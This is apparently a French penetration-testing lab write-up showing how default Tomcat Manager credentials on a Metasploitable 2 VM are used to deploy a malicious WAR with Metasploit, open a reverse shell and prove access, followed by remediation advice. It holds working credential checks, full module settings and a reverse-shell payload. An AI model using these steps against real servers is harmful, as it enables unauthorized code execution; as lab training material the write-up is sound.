Tomcat Manager — déploiement de WAR

Identifiants par défaut → déploiement d'une application web malveillante

Service / PortApache Tomcat (manager) — port 8180
CibleMetasploitable 2 — 192.168.56.101
CVECVE-2009-3548 (identifiants par défaut du Manager)
RésultatShell tomcat55 (uid=110, accès système)
Testé parZANNOU Josaphat

1. Identification

L'interface d'administration de Tomcat (le Manager) permet de déployer des applications web au format .war. Si elle est protégée par des identifiants par défaut (tomcat:tomcat), un attaquant peut y déployer une application contenant un shell et la faire exécuter par le serveur. Le scan identifie le service sur le port 8180.

2. Accès au Manager — identifiants par défaut

L'interface /manager/html répond 401 (authentification requise). On teste les identifiants par défaut tomcat:tomcat :

$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101:8180/manager/html
401
$ curl -s -u tomcat:tomcat http://192.168.56.101:8180/manager/html | grep -i "Tomcat Web Application Manager"
<font size="+2">Tomcat Web Application Manager</font>

tomcat:tomcat fonctionne : la page du Manager s'affiche, on a la main sur le déploiement d'applications.

3. Méthode d'identification de la CVE et du module

Le module qui automatise l'attaque et sa référence :

$ msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"

Disclosed: 2009-11-09
References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  ...

Le module exploit/multi/http/tomcat_mgr_deploy correspond à CVE-2009-3548 (identifiants par défaut du Manager Tomcat). Son mécanisme : s'authentifier avec les identifiants fournis, téléverser un WAR contenant un shell JSP, le faire exécuter, puis le retirer (nettoyage automatique).

Les identifiants par défaut du Manager (tomcat:tomcat) permettent de déployer une application arbitraire — donc d'exécuter du code sur le serveur, avec les droits du compte tomcat55.

4. Démarche d'exploitation

Démarche interactive dans msfconsole, commande par commande :

msf6 > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 192.168.56.101
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set payload java/shell_reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_deploy) > set LHOST 192.168.56.1
msf6 exploit(multi/http/tomcat_mgr_deploy) > set LPORT 4447

Point d'attention — HttpUsername/ HttpPassword portent les identifiants du Manager ; java/shell_reverse_tcp car le shell s'exécute dans la JVM de Tomcat ; LHOST/LPORT pour la connexion retour.

5. Preuve d'accès obtenu

run -z déploie le WAR malveillant, l'exécute, ouvre la session, puis retire l'application (Undeploying) ; sessions -c "..." -i 1 exécute les commandes de preuve :

msf6 exploit(multi/http/tomcat_mgr_deploy) > run -z
[*] Executing /fVY5vqIcnR8WMzkYUQYiMSBZf4/o8udnNhzXBfSJ2wErXrjXKhVyx.jsp...
[*] Undeploying fVY5vqIcnR8WMzkYUQYiMSBZf4 ...
[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.101:58497)
msf6 exploit(multi/http/tomcat_mgr_deploy) > sessions -c "id; uname -a; hostname; whoami" -i 1
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
tomcat55

L'accès obtenu est celui du compte tomcat55 (uid=110), sous lequel tourne le serveur Tomcat — pas root, mais un pied dans le système, point de départ pour une élévation de privilèges. On note le nettoyage automatique du module (Undeploying) qui retire l'application malveillante après ouverture du shell.

6. Remédiation

RECOMMANDATIONS
  • Changer immédiatement les identifiants par défaut du Manager (tomcat-users.xml) pour des mots de passe forts et uniques.
  • Restreindre l'accès au Manager par adresse IP (RemoteAddrValve) et ne l'exposer qu'aux administrateurs, jamais au réseau ouvert.
  • Désactiver ou supprimer l'application Manager si le déploiement à chaud n'est pas nécessaire en production.
  • Faire tourner Tomcat sous un compte dédié non privilégié (c'est déjà le cas ici avec tomcat55) et durcir le système pour limiter l'élévation de privilèges.
